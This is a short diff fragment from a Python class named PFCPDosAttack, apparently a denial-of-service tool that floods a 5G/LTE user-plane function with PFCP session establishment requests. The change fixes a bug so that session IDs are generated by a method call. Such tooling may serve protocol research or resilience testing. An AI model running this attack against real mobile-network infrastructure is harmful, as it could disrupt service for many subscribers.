@@ -179,7 +179,7 @@ class PFCPDosAttack:
             ezpfcp.Send_PFCP_association_setup_req()
             
             ezpfcp.Send_PFCP_session_establishment_req(
-                seid=self.new_seid, 
+                seid=self.new_seid(), 
                 ue_addr=self.new_ue_addr(),
                 teid=self.new_teid())
             if self.verbose:
